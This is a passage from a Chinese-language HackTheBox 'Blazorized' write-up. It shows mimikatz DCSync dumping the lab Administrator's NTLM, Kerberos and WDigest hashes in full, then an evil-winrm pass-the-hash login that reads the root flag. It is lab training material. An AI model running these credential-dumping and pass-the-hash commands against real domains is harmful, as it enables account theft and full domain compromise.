+<h3 id="Hash-Dump"><a href="#Hash-Dump" class="headerlink" title="Hash Dump"></a>Hash Dump</h3><p>使用DCSync权限，SSA_6010可以dump域的所有hash。在此之前，已经通过主机的secrets-dump（最近一次是在<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDI0LzEwLzI2L2h0Yi1taXN0Lmh0bWwjc2VjcmV0c2R1bXA=">Mist<i class="fa fa-external-link-alt"></i></span>上）多次展示了这一点。但在这个例子中，没有想要dump的用户的creds。用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHo=">MimiKatz<i class="fa fa-external-link-alt"></i></span>。</p>
+<p>把它上传到\programdata（使用Evil-WinRM shell，但Python web也可以）。当以.\mimikatz.exe运行时，它是一个交互式工具，在这个reverse shell中，它只会挂起和&#x2F;或失败。但是可以在命令行以mimikatz.exe “[command]” “[command]” exit格式传递命令。</p>
+<p>需要的mimikatz命令是：lsadump::dcsync &#x2F;user:administrator：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">PS C:\programdata&gt; .\mimikatz <span class="string">&quot;lsadump::dcsync /user:administrator&quot;</span> <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::dcsync /user:administrator</span></span><br><span class="line">[DC] <span class="string">&#x27;blazorized.htb&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC1.blazorized.htb&#x27;</span> will be the DC server</span><br><span class="line">[DC] <span class="string">&#x27;administrator&#x27;</span> will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : Administrator</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : 2/25/2024 11:54:43 AM</span><br><span class="line">Object Security ID   : S-1-5-21-2039403211-964143010-2924010611-500</span><br><span class="line">Object Relative ID   : 500</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3</span><br><span class="line">    ntlm- 0: f55ed1465179ba374ec1cad05b34a5f3</span><br><span class="line">    ntlm- 1: eecc741ecf81836dcd6128f5c93313f2</span><br><span class="line">    ntlm- 2: c543bf260df887c25dd5fbacff7dcfb3</span><br><span class="line">    ntlm- 3: c6e7b0a59bf74718bce79c23708a24ff</span><br><span class="line">    ntlm- 4: fe57c7727f7c2549dd886159dff0d88a</span><br><span class="line">    ntlm- 5: b471c416c10615448c82a2cbb731efcb</span><br><span class="line">    ntlm- 6: b471c416c10615448c82a2cbb731efcb</span><br><span class="line">    ntlm- 7: aec132eaeee536a173e40572e8aad961</span><br><span class="line">    ntlm- 8: f83afb01d9b44ab9842d9c70d8d2440a</span><br><span class="line">    ntlm- 9: bdaffbfe64f1fc646a3353be1c2c3c99</span><br><span class="line">    lm  - 0: ad37753b9f78b6b98ec3bb65e5995c73</span><br><span class="line">    lm  - 1: c449777ea9b0cd7e6b96dd8c780c98f0</span><br><span class="line">    lm  - 2: ebbe34c80ab8762fa51e04bc1cd0e426</span><br><span class="line">    lm  - 3: 471ac07583666ccff8700529021e4c9f</span><br><span class="line">    lm  - 4: ab4d5d93532cf6ad37a3f0247db1162f</span><br><span class="line">    lm  - 5: ece3bdafb6211176312c1db3d723ede8</span><br><span class="line">    lm  - 6: 1ccc6a1cd3c3e26da901a8946e79a3a5</span><br><span class="line">    lm  - 7: 8b3c1950099a9d59693858c00f43edaf</span><br><span class="line">    lm  - 8: a14ac624559928405ef99077ecb497ba</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 36ff197ab8f852956e4dcbbe85e38e17</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : BLAZORIZED.HTBAdministrator</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 29e501350722983735f9f22ab55139442ac5298c3bf1755061f72ef5f1391e5c</span><br><span class="line">      aes128_hmac       (4096) : df4dbea7fcf2ef56722a6741439a9f81</span><br><span class="line">      des_cbc_md5       (4096) : 310e2a0438583dce</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (4096) : eeb59c1fa73f43372f40f4b0c9261f30ce68e6cf0009560f7744d8871058af2c</span><br><span class="line">      aes128_hmac       (4096) : db4d9e0e5cd7022242f3e03642c135a6</span><br><span class="line">      des_cbc_md5       (4096) : 1c67ef730261a198</span><br><span class="line">    OlderCredentials</span><br><span class="line">      aes256_hmac       (4096) : bb7fcd1148a3863c9122784becf13ff7b412af7d734162ed3cb050375b1a332c</span><br><span class="line">      aes128_hmac       (4096) : 2d9925ef94916523b24e43d1cb8396ee</span><br><span class="line">      des_cbc_md5       (4096) : 9b01158c8923ce68</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : BLAZORIZED.HTBAdministrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : 310e2a0438583dce</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : 1c67ef730261a198</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    01  7e35fe37aac9f26cecc30390171b6dcf</span><br><span class="line">    02  a8710c4caaab28c0f2260e7c7bd3b262</span><br><span class="line">    03  81eae4cf7d9dadff2073fbf2d5c60539</span><br><span class="line">    04  7e35fe37aac9f26cecc30390171b6dcf</span><br><span class="line">    05  9bc0a87fd20d42df13180a506db93bb8</span><br><span class="line">    06  26d42d164b0b82e89cf335e8e489bbaa</span><br><span class="line">    07  d67d01da1b2beed8718bb6785a7a4d16</span><br><span class="line">    08  7f54f57e971bcb257fc44a3cd88bc0e3</span><br><span class="line">    09  b3d2ebd83e450c6b0709d11d2d8f6aa8</span><br><span class="line">    10  1957f9211e71d307b388d850bdb4223f</span><br><span class="line">    11  2fa495bdf9572e0d1ebb98bb6e268b01</span><br><span class="line">    12  7f54f57e971bcb257fc44a3cd88bc0e3</span><br><span class="line">    13  de0bba1f8bb5b81e634fbaa101dd8094</span><br><span class="line">    14  2d34f278e9d98e355b54bbd83c585cb5</span><br><span class="line">    15  06b7844e04f68620506ca4d88e51705d</span><br><span class="line">    16  97f5ceadabcfdfcc019dc6159f38f59e</span><br><span class="line">    17  ed981c950601faada0a7ce1d659eba95</span><br><span class="line">    18  cc3d2783c1321d9d2d9b9b7170784283</span><br><span class="line">    19  0926e682c1f46c007ba7072444a400d7</span><br><span class="line">    20  1c3cec6d41ec4ced43bbb8177ad6e272</span><br><span class="line">    21  30dcd2ebb2eda8ae4bb2344a732b88f9</span><br><span class="line">    22  b86556a7e9baffb7faad9a153d1943c2</span><br><span class="line">    23  c6e4401e50b8b15841988e4314fbcda2</span><br><span class="line">    24  d64d0323ce75a4f3dcf0b77197009396</span><br><span class="line">    25  4274d190e7bc915d4047d1a63776bc6c</span><br><span class="line">    26  a04215f3ea1d2839a3cdca4ae01e2703</span><br><span class="line">    27  fff4b2817f8298f09fd45c3be4568ab1</span><br><span class="line">    28  2ea3a6b979470233687bd913a8234fc7</span><br><span class="line">    29  73d831d131d5e67459a3949ec0733723</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>
+
+<p>给出了管理员帐户的NTLM hash</p>
+<h3 id="shell-1"><a href="#shell-1" class="headerlink" title="shell"></a>shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/blazorized <span class="comment"># evil-winrm -i blazorized.htb -u administrator -H f55ed1465179ba374ec1cad05b34a5f3                                         1 ↵</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">blazorized\administrator</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cat</span> ..\Desktop\root.txt</span><br><span class="line">e77a62dcd68cd96f3b8714bff9587978</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="253 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="253 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>253
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2024/11/10/blazorized/" title="HackTheBox Blazorized []">https://fdlucifer.github.io/2024/11/10/blazorized/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="fa fa-stack-exchange"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/DC/" rel="tag"><i class="fa fa-tag"></i> DC</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/10/27/mist/" rel="prev" title="HackTheBox Mist [CVE-2024-9405 + PetitPotam Attack + shadow credential + s4u impersonat + reading GMSA password + abusing AddKeyCredentialLink + exploiting ADCS ESC 13 twice]">
+                  <i class="fa fa-chevron-left"></i> HackTheBox Mist [CVE-2024-9405 + PetitPotam Attack + shadow credential + s4u impersonat + reading GMSA password + abusing AddKeyCredentialLink + exploiting ADCS ESC 13 twice]
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">253</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>Word count total: </span>
+    <span title="Word count total">676k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>Reading time total &asymp;</span>
+    <span title="Reading time total">40:58</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
